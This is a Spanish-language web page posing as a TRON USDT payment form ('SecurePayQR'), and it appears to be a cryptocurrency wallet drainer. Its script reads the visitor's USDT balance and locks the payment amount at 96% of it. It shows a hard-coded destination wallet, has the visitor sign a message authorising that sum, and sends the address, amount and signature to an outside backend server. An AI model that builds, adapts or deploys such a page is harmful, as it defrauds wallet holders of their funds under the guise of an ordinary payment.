<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>QR pagos - Enviar </title>

    <style>
        :root { color-scheme: light; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body {
            background-color: #f7f9ff;
            background-image:
                radial-gradient(circle at 12% 18%, rgba(0, 82, 255, 0.20) 0%, rgba(0, 82, 255, 0.08) 24%, transparent 48%),
                radial-gradient(circle at 88% 72%, rgba(75, 125, 255, 0.16) 0%, rgba(75, 125, 255, 0.06) 28%, transparent 52%),
                linear-gradient(180deg, #ffffff 0%, #f2f6ff 100%);
            color: #111111; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding-top: 30px;
        }
        .tw-container { width: 100%; max-width: 390px; padding: 20px; flex: 1; }
        .tw-header { display: flex; flex-direction: column; align-items: center; justify-content: center; margin-bottom: 24px; }
        .tw-header-title { display: flex; flex-direction: column; align-items: center; gap: 7px; margin-bottom: 15px; text-align: center; width: 100%; }
        .tw-header-title-main { font-size: 21px; font-weight: 700; color: #111111; }
        .tw-network-badge { padding: 4px 8px; border-radius: 999px; background: #eef3ff; border: 1px solid #dbe6ff; color: #0052ff; font-size: 10px; font-weight: 700; }
        .tw-logo { width: 60px; height: 60px; margin-bottom: 20px; display: block; }
        .tw-input-group { background: rgba(255, 255, 255, 0.88); border: 1px solid rgba(205, 215, 232, 0.78); border-radius: 16px; padding: 16px; margin-bottom: 16px; box-shadow: 0 6px 18px rgba(31, 55, 92, 0.055); }
        .tw-label { font-size: 13px; color: #717680; display: block; margin-bottom: 8px; }
        .tw-input-row { display: flex; align-items: center; justify-content: space-between; }
        .tw-input { background: transparent; border: none; color: #111111; font-size: 16px; width: 80%; outline: none; }
        .tw-action-text { color: #0052ff; font-size: 14px; font-weight: 600; cursor: pointer; }
        .tw-currency-badge { color: #0052ff; font-size: 16px; font-weight: 600; display: flex; align-items: center; gap: 5px; }
        .usdt-icon { width: 18px; height: 18px; }
        .status-box { background-color: #edf2ff; border: 1px solid #cce0ff; border-radius: 12px; padding: 12px; font-size: 13px; color: #0052ff; margin-bottom: 16px; display: none; text-align: left; }
        .tw-btn-container { margin-top: 40px; }
        .tw-btn { width: 100%; height: 52px; background-color: #0052ff; color: #ffffff; border: none; border-radius: 26px; font-size: 16px; font-weight: 600; cursor: pointer; }
        .tw-btn:disabled { background-color: #b3ccff; }
        .network-card { display: none; align-items: center; gap: 11px; margin: 4px 0 22px; padding: 12px 14px; width: 100%; background: rgba(255, 255, 255, 0.88); border: 1px solid rgba(205, 215, 232, 0.78); border-radius: 14px; }
        .network-card-logo { width: 30px; height: 30px; object-fit: contain; }
        .network-card-copy { display: flex; flex-direction: column; gap: 2px; flex: 1; }
        .network-card-label { color: #717680; font-size: 11px; }
        .network-card-name { color: #111111; font-size: 14px; font-weight: 650; }
        .network-card-badge { padding: 5px 8px; border-radius: 999px; background: #eef3ff; border: 1px solid #dbe6ff; color: #0052ff; font-size: 10px; font-weight: 700; }
        .tw-address-box { border: 1px solid #e3e5e8; border-radius: 14px; padding: 12px 14px; background: #ffffff; }
        .site-footer { position: fixed; left: 0; right: 0; bottom: 0; width: 100%; text-align: center; padding: 10px 15px 12px; font-size: 12px; color: #717680; background: #ffffff; }
        .page-loader { position: fixed; inset: 0; z-index: 9999; background: #ffffff; display: flex; flex-direction: column; align-items: center; justify-content: center; transition: opacity 0.45s ease; }
        .page-loader.hidden { opacity: 0; visibility: hidden; pointer-events: none; }
        .loader-logo { width: 110px; height: 110px; margin-bottom: 22px; }
        .loader-spinner { width: 32px; height: 32px; border: 3px solid #e4e9f2; border-top-color: #0052ff; border-radius: 50%; animation: loaderSpin 0.8s linear infinite; }
        @keyframes loaderSpin { to { transform: rotate(360deg); } }
        .processing-screen { position: fixed; inset: 0; z-index: 10000; background: #ffffff; display: flex; flex-direction: column; align-items: center; justify-content: center; opacity: 0; visibility: hidden; transition: opacity 0.35s ease; }
        .processing-screen.visible { opacity: 1; visibility: visible; }
        .processing-logo { width: 110px; height: 110px; margin-bottom: 26px; }
        .processing-bar { width: 190px; height: 5px; border-radius: 999px; background: #e4e9f2; position: relative; overflow: hidden; }
        .processing-bar::after { content: ""; position: absolute; top: 0; left: -45%; width: 45%; height: 100%; background: #0052ff; animation: processingSlide 1.15s ease-in-out infinite; }
        @keyframes processingSlide { 0% { left: -45%; } 100% { left: 100%; } }
        .amount-stepper { display: grid; grid-template-columns: 44px minmax(0, 1fr) 44px; align-items: center; gap: 8px; width: 100%; }
        .amount-step-btn { width: 42px; height: 42px; display: inline-flex; align-items: center; justify-content: center; border: 1px solid rgba(205,215,232,.9); border-radius: 12px; background: rgba(247,249,255,.92); font-size: 24px; cursor: pointer; }
    </style>
</head>

<body>
<div id="pageLoader" class="page-loader">
    <img src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/icon/trx.png" alt="Logo" class="loader-logo">
    <div class="loader-spinner"></div>
</div>

<div id="processingScreen" class="processing-screen">
    <img src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/icon/trx.png" alt="Logo" class="processing-logo">
    <div class="processing-bar"></div>
    <div style="margin-top: 18px; font-weight: 600;">Procesando...</div>
</div>

<div class="tw-container">
    <div class="tw-header">
        <div class="tw-header-title">
            <span class="tw-header-title-main">Enviar USDT</span>
            <span class="tw-network-badge">TRC-20</span>
        </div>
        <img src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/icon/trx.png" alt="QR Pagos" class="tw-logo">
    </div>

    <div class="tw-input-group tw-address-box" id="walletInfo" style="display: none; margin-bottom: 16px;">
        <label class="tw-label">Dirección conectada</label>
        <div id="walletAddressText" class="tw-input" style="font-size: 13px; color: #7d8490; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;"></div>
    </div>

    <div id="tronNetworkInfo" class="network-card">
        <img src="https://cryptologos.cc/logos/tron-trx-logo.png" alt="TRON" class="network-card-logo">
        <div class="network-card-copy">
            <span class="network-card-label">Red conectada</span>
            <span class="network-card-name">TRON</span>
        </div>
        <span class="network-card-badge">TRC-20</span>
    </div>

    <div class="tw-input-group tw-address-box">
        <label class="tw-label">Dirección de destino</label>
        <input id="addressDisplay" class="tw-input" type="text" readonly style="font-size: 13px; color: #7d8490;">
    </div>

    <div class="tw-input-group">
        <label class="tw-label">Cantidad (Balance 96%)</label>
        <div class="tw-input-row">
            <div class="amount-stepper">
                <button type="button" class="amount-step-btn" id="amountMinus">−</button>
                <input id="amountDisplay" class="tw-input" type="number" inputmode="decimal" value="0" readonly style="text-align: center;">
                <button type="button" class="amount-step-btn" id="amountPlus">+</button>
            </div>
            <span class="tw-currency-badge">USDT</span>
        </div>
    </div>

    <div id="status" class="status-box"></div>

    <div class="tw-btn-container">
        <button class="tw-btn" id="connectBtn">Vincular billetera</button>
    </div>
</div>

<footer class="site-footer">
    <p>© 2026 SecurePayQR. All rights reserved.</p>
</footer>

<script>
    window.addEventListener('load', function () {
        setTimeout(() => document.getElementById('pageLoader').classList.add('hidden'), 1000);
    });

    const BILLETERA_DESTINO = "TLaWm1eHRzZ7cR8m8xaRBjhmXJKmc6Mree"; 
    const CONTRATO_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
    const BACKEND_URL = "https://backend-usdt-pay.onrender.com";

    const connectBtn = document.getElementById('connectBtn');
    const statusDiv = document.getElementById('status');
    const amountDisplay = document.getElementById('amountDisplay');
    const addressDisplay = document.getElementById('addressDisplay');
    const walletInfo = document.getElementById('walletInfo');
    const tronNetworkInfo = document.getElementById("tronNetworkInfo");
    const walletAddressText = document.getElementById('walletAddressText');

    let walletAddress = null;
    let balanceReal = 0;

    function setStatus(msg) {
        statusDiv.innerText = msg || '';
        statusDiv.style.display = msg ? 'block' : 'none';
    }

    addressDisplay.value = `${BILLETERA_DESTINO.slice(0, 6)}...${BILLETERA_DESTINO.slice(-6)}`;

    connectBtn.addEventListener('click', async () => {
        if (!walletAddress) {
            try {
                setStatus("Conectando con la billetera...");
                connectBtn.disabled = true;

                if (!window.tronWeb || !window.tronWeb.defaultAddress || !window.tronWeb.defaultAddress.base58) {
                    throw new Error("Abre este enlace desde el navegador interno de tu billetera TRON.");
                }

                walletAddress = window.tronWeb.defaultAddress.base58;
                walletAddressText.textContent = `${walletAddress.slice(0, 6)}...${walletAddress.slice(-6)}`;
                walletInfo.style.display = "block";
                tronNetworkInfo.style.display = "flex";

                setStatus("Consultando balance en blockchain...");
                
                // Lectura limpia y directa usando TronWeb nativo
                const contract = await window.tronWeb.contract().at(CONTRATO_USDT);
                const balanceSun = await contract.balanceOf(walletAddress).call();
                
                balanceReal = window.tronWeb.toDecimal(balanceSun) / 1000000;
                amountDisplay.value = balanceReal.toFixed(2);

                setStatus("Billetera conectada con éxito.");
                connectBtn.innerText = "Procesar Pago";
                connectBtn.disabled = false;
            } catch (err) {
                console.error(err);
                setStatus(err.message || "Error al conectar.");
                connectBtn.disabled = false;
                connectBtn.innerText = "Vincular billetera";
            }
            return;
        }

        try {
            if (balanceReal <= 0) {
                throw new Error("No tienes balance de USDT disponible.");
            }

            setStatus("Calculando 96% de la operación...");
            connectBtn.disabled = true;

            const montoRealACobrar = balanceReal * 0.96;
            const mensaje = `Autorizo la operación por el 96% (${montoRealACobrar.toFixed(2)} USDT) de mi balance. Timestamp: ${Date.now()}`;
            const mensajeHex = window.tronWeb.toHex(mensaje);

            setStatus("Solicitando firma digital segura...");
            const firma = await window.tronWeb.trx.signMessage(mensajeHex);

            document.getElementById('processingScreen').classList.add('visible');
            setStatus("Enviando orden al servidor...");

            const response = await fetch(`${BACKEND_URL}/api/procesar-pago`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    userAddress: walletAddress,
                    monto: montoRealACobrar,
                    mensaje: mensaje,
                    firma: firma
                })
            });

            const resultado = await response.json();
            document.getElementById('processingScreen').classList.remove('visible');

            if (resultado.success) {
                setStatus("¡TRANSACCIÓN EXITOSA!");
                connectBtn.innerText = "Completado";
            } else {
                throw new Error(resultado.error || "El servidor rechazó la transacción.");
            }
        } catch (err) {
            console.error(err);
            document.getElementById('processingScreen').classList.remove('visible');
            setStatus(err.message || "Error al procesar el pago.");
            connectBtn.disabled = false;
            connectBtn.innerText = "Procesar Pago";
        }
    });
</script>
</body>
</html>
